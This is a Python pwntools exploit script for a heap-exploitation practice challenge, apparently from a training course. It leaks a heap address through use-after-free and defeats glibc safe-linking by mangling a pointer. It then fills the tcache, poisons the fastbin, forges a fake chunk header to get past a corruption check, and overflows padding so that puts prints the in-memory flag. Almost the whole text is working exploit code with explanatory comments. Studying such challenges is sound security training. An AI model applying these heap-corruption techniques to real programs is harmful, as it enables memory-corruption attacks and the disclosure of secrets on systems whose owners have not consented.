from pwn import * 

binary = './toddlerheap_level6.0_patched'
p = process(binary)

s = '''
b mallo c
b free
'''


p.recvuntil("Reading the flag into ")
target = int(p.recvuntil(".", drop = True).decode(), 16)

print(hex(target))

p.sendline("calloc 0 24")
p.sendline("calloc 1 24")

p.sendline("free 0")
p.sendline("free 1")

p.sendline("puts 0")



p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')




heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x390


# get ready to calloc to somewhere a bit far away from the flag so that we do not zero out the flag
# at the same time ensuring that the address to calloc to, is 0x10 bytes aligned
mangled_ptr = ((chunk_addr >> 12) ^ (target - 0x8 - 0x10 - 0x10))


# since calloc doesn't get stuff from tcache, we fill up tcache and do the poisoning in fastbin
for i in range(2,7):
	p.sendline(f"calloc {i} 24")
for i in range(2,7):
	p.sendline(f"free {i}")


# the two freed chunks in fastbins
p.sendline(f"calloc 7 24")
p.sendline(f"calloc 8 24")
p.sendline(f"free 7")
p.sendline(f"free 8")


# overwrite the first 8 bytes (next* pointer) of chunk 8 to our target address
p.sendline("safer_read 8")
p.sendline(p64(mangled_ptr))

# mkae the fake header to bypass `malloc(): memory corruption (fast)`
p.sendline("read_to_global 3000")
p.send(b'A' * 0x2e0 + p64(0) + p64(0x21) + b'B' * 0x18)



p.sendline(f"calloc 8 24")
p.sendline(f"calloc 7 24")

p.sendline("read_to_global 3000")

# overflow some more 'A's up to the flag, so that we can 'puts' the flag. Since 'puts' print stuff until null byte
p.send(b'A' * 0x308)
# 'puts' the chunk
p.sendline("puts 7")

# shows `Data: AAAAAAAAAAAAAAAAAAAAAAAAflag{faker}`
#gdb.attach(p, s)
p.interactive()
